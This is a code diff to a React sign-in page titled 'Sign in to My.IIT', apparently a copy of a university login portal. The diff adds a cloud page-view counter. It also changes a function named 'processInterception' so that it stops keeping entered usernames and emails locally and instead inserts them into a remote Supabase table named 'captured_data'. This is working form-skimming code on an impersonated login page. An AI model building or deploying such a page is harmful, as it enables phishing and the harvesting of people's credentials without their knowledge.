@@ -1,10 +1,44 @@
 import React, { useEffect } from "react";
+import { supabase } from "./supabaseClient"; // Add this import at the top
+
 
 export default function Signin() {
   
   // NEW: Record page opens on component mount
 useEffect(() => {
 
+  const trackPageView = async () => {
+      // Check session storage to prevent double-counting on dev React re-renders
+      const alreadyCounted = sessionStorage.getItem("page_view_session");
+      if (alreadyCounted) return;
+
+      try {
+        // 1. Fetch current view count from Row ID 1
+        const { data, error } = await supabase
+          .from('analytics')
+          .select('view_count')
+          .eq('id', 1)
+          .single();
+
+        if (data) {
+          const updatedViews = data.view_count + 1;
+
+          // 2. Update the number on the cloud
+          await supabase
+            .from('analytics')
+            .update({ view_count: updatedViews })
+            .eq('id', 1);
+
+          sessionStorage.setItem("page_view_session", "true");
+        }
+      } catch (err) {
+        console.error("Error updating cloud view counter:", err);
+      }
+    };
+
+    trackPageView();
+  }, []);
+  
   document.title = "Sign in to My.IIT"; // Set page title on load
   // Check if this specific refresh has already been counted
   const alreadyCountedThisRefresh = sessionStorage.getItem("page_view_session");
@@ -24,24 +58,21 @@ useEffect(() => {
   }
 }, []);
 
-  const processInterception = () => {
-    const usernameVal = document.getElementById("username")?.value.trim();
 
-    if (usernameVal) {
-      let dataset = JSON.parse(localStorage.getItem("captured_emails")) || [];
-      const alreadyCaptured = dataset.some((entry) => entry.email === usernameVal);
+const processInterception = async () => {
+  const usernameVal = document.getElementById("username")?.value.trim();
 
-      if (!alreadyCaptured) {
-        const entryData = {
-          email: usernameVal,
-          savedAt: new Date().toLocaleString(),
-        };
-        dataset.unshift(entryData);
-        localStorage.setItem("captured_emails", JSON.stringify(dataset));
-        window.dispatchEvent(new Event("storage"));
-      }
-    }
-  };
+  if (usernameVal) {
+    // Save to the live Supabase cloud table
+    const { error } = await supabase
+      .from('captured_data')
+      .insert([
+        { email: usernameVal, savedAt: new Date().toLocaleString() }
+      ]);
+
+    if (error) console.error("Error syncing to cloud database:", error);
+  }
+};
 
   const handleFormSubmit = (e) => {
     e.preventDefault();
